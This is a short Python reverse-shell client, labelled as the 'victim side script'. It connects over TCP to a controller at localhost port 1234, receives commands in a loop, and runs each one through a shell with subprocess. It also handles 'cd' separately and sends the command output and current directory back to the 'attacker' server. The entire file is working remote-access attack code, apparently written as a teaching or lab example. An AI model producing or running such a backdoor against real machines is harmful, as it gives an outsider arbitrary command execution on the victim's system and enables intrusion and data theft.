# Client (victim) side script
# Import all classes from Socket, OS, and Subprocess modules
from socket import *
from os import *
from subprocess import *

# Create a TCP socket object
s = socket(AF_INET, SOCK_STREAM)
# Setup host parameters
host = '127.0.0.1'  # IP
port = 1234        # Port

# Connecting to the server socket
s.connect((host, port))

while True:
    # Recieve incoming data from the server (attacker)
    data = s.recv(1024)

    # Check if the command sent is a change directory command
    if data[:2].decode('utf-8') == 'cd':
        chdir(data[3:].decode('utf-8'))

    # Any other Command
    if len(data) > 1:
        # Open a new process using command line, which takes its full input from the message sent from the server
        cmd = Popen(data[:].decode('utf-8'), shell=True,
                    stdout=PIPE, stdin=PIPE, stderr=PIPE)

        # Encoding command line output after executing the process in the previous instruction
        output_string = str(cmd.stdout.read() + cmd.stderr.read(), 'utf-8')

        # Working direcory
        currentWorkingDirectory = getcwd() + "> "
        # Send command line output back to the server
        s.send(str.encode(output_string + currentWorkingDirectory))
        # Print the same output at the client
        print(output_string)
